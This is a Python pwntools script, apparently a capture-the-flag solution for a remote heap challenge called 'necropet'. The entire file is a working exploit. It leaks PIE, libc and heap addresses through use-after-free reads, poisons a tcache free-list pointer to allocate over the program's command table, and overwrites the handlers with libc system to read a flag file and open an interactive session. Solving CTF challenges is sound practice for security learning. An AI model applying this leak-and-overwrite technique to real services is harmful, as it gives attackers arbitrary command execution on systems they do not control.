from pwn import *

context.log_level = 'info'

libc = ELF('./forplayers/libc.so.6', checksec=False)

UNSORTED_HEAD = 0x203b20        # main_arena + 0x60
SPECIES_CAT   = 0x31ec          # species_book[0] -> "cat"
COMMANDS      = 0x5020
FLAG          = '/home/necropet/thisisratratratrat_puipui.txt'

io = remote('chal.thjcc.org', 1024)

def cmd(s):
    io.sendline(s.encode())
    io.recvline()

def admit(slot, cap, ln=0, note=b''):
    io.sendline(f'admit {slot} 0 {cap} {ln}'.encode())
    if ln:
        io.send(note.ljust(ln, b'\x00'))
    io.recvline()

def show():
    io.sendline(b'show')
    io.recvuntil(b'record: ')
    return bytes.fromhex(io.recvline().strip().decode())

io.recvuntil(b'type help for commands\n')

# PIE + libc leak
admit(0, 0x4d0)
admit(1, 0x20)
cmd('select 0')
pie = u64(show()[0x18:0x20]) - SPECIES_CAT
cmd('release 0')
libc.address = u64(show()[:8]) - UNSORTED_HEAD

# heap leak
admit(2, 0x20)
admit(3, 0x20)
admit(4, 0x30)
cmd('select 4')
cmd('release 4')
heap = u64(show()[:8])

log.success(f'pie {pie:#x} / libc {libc.address:#x} / heap {heap << 12:#x}')

cmd('select 2')
cmd('release 3')
cmd('release 2')
io.sendline(b'revise 8')
io.send(p64(heap ^ (pie + COMMANDS)))
io.recvline()

admit(5, 0x20)
admit(6, 0x20, 0x20, p64(libc.sym.system)
                   + b'aaa\x00'.ljust(16, b'\x00')
                   + p64(libc.sym.system))

io.sendline(f'aaa cat {FLAG}'.encode())
io.interactive()
